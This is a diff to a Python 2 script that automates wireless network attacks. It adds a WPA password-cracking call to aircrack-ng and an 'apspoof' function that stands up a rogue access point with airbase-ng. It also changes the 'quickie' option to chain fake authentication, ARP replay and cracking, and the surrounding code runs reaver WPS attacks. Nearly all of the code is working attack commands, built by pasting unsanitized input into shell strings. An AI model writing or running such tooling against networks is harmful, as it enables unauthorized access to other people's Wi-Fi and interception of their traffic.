@@ -235,7 +235,9 @@ def WPA_PSK():
    os.system("gnome-terminal -x aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
    #wpa = open(bssid+'wpass.tkc')
    #print wpa.readlines("The wpa password is: ")
-
+def WPA_by_AreaCode():
+   print "aircrack-ng -w - -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc"
+   os.system("gnome-terminal -x aircrack-ng -w - -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
 def WPS_Crack():
    print "reaver -i mon1 -b "+bssid+" -vv"
    os.system("gnome-terminal -x aireplay-ng mon0 -1 120 -a "+bssid+" -e "+essid+" -h "+station+" --ignore-negative-one")
@@ -270,6 +272,10 @@ def connect():
    connectlist= ';'.join(("iwconfig "+interface+" essid "+essid+" mode managed channel "+channel+" key "+wepkey,
 		"dhclient "+interface))
    os.system(connectlist)
+def apspoof():
+   spoofinap = "airbase-ng -a "+station+" --essid "+spoofap+" -P -i mon1 -v mon0"
+   print spoofinap
+   os.system ("gnome-terminal -x "+spoofinap+" &")
    
 #==========================qr==========================D
 
@@ -346,12 +352,13 @@ while (cont == "n"):
 		macspoof()
 		station = spoofmac 
 	elif listen_selection =="12":
-		spoofap = raw_input("AP ESSID")
+		spoofap = raw_input("AP ESSID: ")
 		apspoof()
-	elif listen_selection == "quicky":
-		print "performing quickie"
+	elif listen_selection == "quickie":
+		print "performing quickie... skeet skeet"
 		fakeauth()
 		arpreplay()
+                aircrack()
 	else:
 		print ">:("
 	
